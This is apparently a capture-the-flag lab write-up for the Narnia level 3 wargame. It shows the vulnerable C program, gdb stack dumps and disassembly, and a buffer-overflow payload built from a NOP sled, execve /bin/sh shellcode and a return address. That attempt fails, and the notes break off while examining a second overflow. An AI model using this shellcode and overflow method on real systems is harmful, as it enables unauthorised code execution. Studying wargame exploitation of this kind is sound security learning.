---NARNIA LEVEL 3---

int main(int argc, char **argv){
    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];
    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }
    /* open files */
    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }
    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);
    /* close 'em */
    close(ifd);
    close(ofd);
    exit(1);
}

Output of loading strcpy with a 31 byte "U" string:

(gdb) x/28x $esp
0xffffd658:     0xffffd680(esp)  0xffffd88e       0xffffffff       0xf7fc5000
0xffffd668:     0xf7e1ee18       0xf7fd2e28       0xf7fc5000       0xffffd754
0xffffd678:     0xf7ffcd00       0x00200000       0x55555555       0x55555555
0xffffd688:     0x55555555       0x55555555       0x55555555       0x55555555
0xffffd698:     0x55555555       0x00555555       0x7665642f       0x6c756e2f
0xffffd6a8:     0x0000006c       0x00000000       0x00000002       0xf7fc5000
0xffffd6b8:     0x00000000(ebp)  0xf7e2a286(eip)  0x00000002       0xffffd754

Output of info frame for the purpose of discovering $eip:

Breakpoint 1, 0x0804855f in main ()
(gdb) info frame
Stack level 0, frame at 0xffffd6a0:
 eip = 0x804855f in main; saved eip = 0xf7e2a286
 Arglist at 0xffffd698, args:
 Locals at 0xffffd698, Previous frame's sp is 0xffffd6a0
 Saved registers:
  ebp at 0xffffd698, eip at 0xffffd69c

notes: 
esp, ebp, eip registers @ 0xffffd658, 0xffffd6b8, 0xffffd6b8 + 4 respectively
the null terminator put at the end of the string @ 0xffffd698 + 4 (not that relevant, but cool to see in person)

Attempt to solve level 3 with solution from level 2 (nop slide + shell code + memory address): 

payload: 
$(python -c 'print "\x90"*35 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x60\xd6\xff\xff"')
output:
Breakpoint 1, 0x0804855f in main ()
(gdb) x/28x $esp
0xffffd638:     0xffffd660      0xffffd86d      0xffffffff      0xf7fc5000
0xffffd648:     0xf7e1ee18      0xf7fd2e28      0xf7fc5000      0xffffd734
0xffffd658:     0xf7ffcd00      0x00200000      0x90909090      0x90909090
0xffffd668:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd678:     0x90909090      0x90909090      0x31909090      0x2f6850c0
0xffffd688:     0x6868732f      0x6e69622f      0x5350e389      0xc289e189
0xffffd698:     0x80cd0bb0      0xffffd660      0x00000000      0xffffd734
                                     ^
                                  altered

narnia3@narnia:~$ /narnia/narnia3 $(python -c 'print "\x90"*35 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x60\xd6\xff\xff"')
error opening 1Ph//shh/binPS̀`

As per expectation, no shell appears, so we'll move on.

2) examining the second potential overflow @ write(ofd, buf, sizeof(buf)-1);

The size of buf is 32 bytes and the file pointed to by ofd is 16 characters long. so something can be overwritten here. 
Assembly for read/write functions:

read(ifd, buf, sizeof(buf)-1):
   0x080485c0 <+181>:   push   $0x1f                    pushing 31, sizeof(buf)-1 onto the stack
   0x080485c2 <+183>:   lea    -0x58(%ebp),%eax
   0x080485c5 <+186>:   push   %eax                     pushing buf, located at -0x58ebp onto stack
   0x080485c6 <+187>:   pushl  -0x8(%ebp)               pushing address of file pointed to by ifd onto stack
   0x080485c9 <+190>:   call   0x8048380 <read@plt>

write(ofd, buf, sizeof(buf)-1):
   0x080485ce <+195>:   add    $0xc,%esp
   0x080485d1 <+198>:   push   $0x1f                    pushing 31, sizeof(buf)-1 onto the stack
   0x080485d3 <+200>:   lea    -0x58(%ebp),%eax
   0x080485d6 <+203>:   push   %eax                     pushing buf, located at -0x58ebp onto stack
   0x080485d7 <+204>:   pushl  -0x4(%ebp)               pushing address of file pointed to by ofd onto stack
   0x080485da <+207>:   call   0x80483e0 <write@plt>

The write function transfers 31 bytes of buf into the file address pointed at by ofd. let's eye the scalpel and dig deeper:



